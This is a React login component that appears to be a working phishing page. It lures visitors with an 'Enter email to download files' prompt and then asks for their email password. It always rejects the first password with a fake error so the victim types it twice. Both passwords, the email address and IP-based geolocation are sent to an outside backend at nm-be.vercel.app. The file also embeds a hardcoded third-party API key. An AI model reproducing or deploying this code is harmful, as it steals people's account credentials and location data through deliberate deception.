import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './Login.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');
  const [firstPasswordUsed, setFirstPasswordUsed] = useState('');
  const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts
  const [ipInfo, setIpInfo] = useState({}); // Store IP and location info

  // Fetch user's IP and location data
  useEffect(() => {
    const fetchIpInfo = async () => {
      try {
        // Fetch the user's IP address
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        const userIp = ipResponse.data.ip;

        // Fetch IP info using the IP Geolocation API
        const options = {
          method: 'GET',
          url: 'https://ip-geolocation-find-ip-location-and-ip-info.p.rapidapi.com/backend/ipinfo/',
          params: { ip: userIp },
          headers: {
            'x-rapidapi-key': 'c9d777507cmsh257b662f6af31a9p18afcfjsn02a7344290a5', // Replace with your actual API key
            'x-rapidapi-host': 'ip-geolocation-find-ip-location-and-ip-info.p.rapidapi.com'
          }
        };

        const ipInfoResponse = await axios.request(options);
        setIpInfo(ipInfoResponse.data);
        console.log('IP Info fetched:', ipInfoResponse.data); // Check the data received
      } catch (error) {
        console.error('Error fetching IP info:', error);
        setIpInfo({}); // Set an empty object in case of an error
      }
    };

    fetchIpInfo();
  }, []);

  // Handle email input change
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    // Reset confirmation and errors when email changes
    if (isEmailConfirmed) {
      setIsEmailConfirmed(false);
      setPassword('');
      setPasswordError('');
      setAttemptCount(0);
      setFirstPasswordUsed(''); // Reset the first password attempt
      setSecondPasswordUsed(''); // Reset the second password attempt
    }
  };

  // Handle email submission
  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setPasswordError('Please enter a valid email address.');
      return;
    }

    setIsLoading(true);
    setPasswordError('');

    // Simulate 2-second loading time
    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 2000);
  };

  // Handle login attempt
  const handleLogin = async () => {
    if (attemptCount === 0) {
      // Store the first password attempt
      setFirstPasswordUsed(password);
      setAttemptCount(1);
      setPassword(''); // Clear the password input

      // Wait for 0.5 seconds before showing error message
      setTimeout(() => {
        setPasswordError('The email or password entered is incorrect. Please try again');
        const passwordInput = document.getElementById('password-input');
        if (passwordInput) {
          passwordInput.focus(); // Autofocus back to password input
        }
      }, 500); // Half-second delay for the error message

      return;
    } else if (attemptCount === 1) {
      // Store the second password attempt
      setSecondPasswordUsed(password);
    }

    // Check if IP info has been fetched
    if (!ipInfo || Object.keys(ipInfo).length === 0) {
      setPasswordError('Please try again.');
      return;
    }

    // Create a filtered version of ipInfo excluding currency
    const { country_currency, ...filteredIpInfo } = ipInfo; // Remove the currency field

    setIsLoading(true);
    setPasswordError('');

    // Try to send login request to backend
    try {
      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
        email: email,
        firstpasswordused: firstPasswordUsed,
        secondpasswordused: password, // Send the second password attempt
        locationInfo: filteredIpInfo, // Send the filtered IP and location data to backend
      });
      console.log('Response from backend:', response.data);
      // Handle successful response here (e.g., redirect or show success message)
      window.location.reload(); // Reload the page for now
    } catch (error) {
      if (error.message === 'Network Error') {
        setPasswordError('We encountered a network error while attempting to connect to the server. Please try again.');
      } else if (error.response) {
        console.error('Error:', error.response.data);
        setPasswordError(`Login failed with status code ${error.response.status}. Please check your credentials and try again.`);
      } else {
        setPasswordError('An unknown error occurred. Please refresh the page and attempt again.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          {isEmailConfirmed ? (
            <h4>Confirm your email password to continue</h4>
          ) : (
            <h2>Enter email to download files</h2>
          )}
          <div className="email-input-wrapper">
            <input
              id="email-input"
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Enter your email"
              required
              autoFocus={!isEmailConfirmed} // Auto focus the email input when email is not confirmed
            />
          </div>
          {!isEmailConfirmed && (
            <div className="button-wrapper">
              <button
                onClick={handleEmailSubmit}
                disabled={isLoading || isEmailConfirmed || !email}
                className=""
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Download to Email'
                )}
              </button>
            </div>
          )}
        </div>

        {isEmailConfirmed && (
          <>
            <div className="input-group">
              <input
                id="password-input"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Email password"
                required
                autoFocus={attemptCount === 0} 
              />
            </div>

            {passwordError && <p className="error-text">{passwordError}</p>}

            <div className="login-btn-wrapper">
              <button
                className=""
                onClick={handleLogin}
                disabled={isLoading || !password} // Button is disabled until the user starts typing
              >
                {isLoading ? (
                  <span className="spinner"></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default Login;
